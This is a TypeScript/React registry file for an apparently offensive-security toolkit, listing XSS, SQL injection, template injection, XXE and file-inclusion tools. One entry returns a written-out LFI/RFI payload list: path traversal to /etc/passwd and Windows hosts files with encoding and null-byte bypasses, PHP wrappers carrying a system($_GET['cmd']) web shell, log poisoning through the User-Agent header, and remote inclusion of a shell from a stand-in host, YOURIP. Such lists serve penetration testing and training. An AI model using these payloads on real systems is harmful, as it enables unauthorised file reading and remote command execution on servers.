import React from 'react';
import type { Tool } from '../../../types';

export const WEB_REGISTRY: Tool[] = [
    {
        id: 'xss_payloads',
        name: 'XSS Payloads',
        category: 'WEB',
        subcategory: 'XSS',
        desc: 'Interactive XSS payload templates & obfuscator',
        authMode: 'none',
        source: 'hacktools',
        component: React.lazy(() => import('../../../components/tools/XSSTool')),
        generate: () => '',
    },
    {
        id: 'sqli_payloads',
        name: 'SQL Injection',
        category: 'WEB',
        subcategory: 'SQLi',
        desc: 'Interactive SQL syntax parser (AST) & injection payloads',
        authMode: 'none',
        source: 'hacktools',
        component: React.lazy(() => import('../../../components/tools/SQLTool')),
        generate: () => '',
    },
    {
        id: 'ssti_payloads',
        name: 'SSTI Payloads',
        category: 'WEB',
        subcategory: 'SSTI',
        desc: 'Interactive Server-Side Template Injection payload generator',
        authMode: 'none',
        generate: () => '',
        source: 'hacktools',
        component: React.lazy(() => import('../../../components/tools/SSTITool')),
    },
    {
        id: 'lfi_rfi',
        name: 'LFI/RFI Payloads',
        category: 'WEB',
        subcategory: 'File Inclusion',
        desc: 'Local and Remote File Inclusion payloads',
        authMode: 'none',
        source: 'hacktools',
        generate: () => `# Basic LFI
../../../etc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd

# Windows LFI
..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
C:\\Windows\\System32\\drivers\\etc\\hosts

# Null Byte (PHP < 5.3.4)
../../../etc/passwd%00
../../../etc/passwd%00.jpg

# PHP Wrappers
php://filter/convert.base64-encode/resource=index.php
php://input
php://data:text/plain,<?php system($_GET['cmd']);?>
expect://id
phar://path/to/file.phar

# Log Poisoning
/var/log/apache2/access.log
/var/log/nginx/access.log
# Inject: <?php system($_GET['cmd']); ?> in User-Agent

# /proc/self/environ
User-Agent: <?php system($_GET['cmd']); ?>
../../../proc/self/environ

# RFI
http://YOURIP/shell.txt
http://YOURIP/shell.txt%00`,
    },
    {
        id: 'xxe_payloads',
        name: 'XXE Injection',
        category: 'WEB',
        subcategory: 'XXE',
        desc: 'Interactive XML External Entity payload generator (In-band & OOB)',
        authMode: 'none',
        generate: () => '',
        source: 'hacktools',
        component: React.lazy(() => import('../../../components/tools/XXETool')),
    },
];
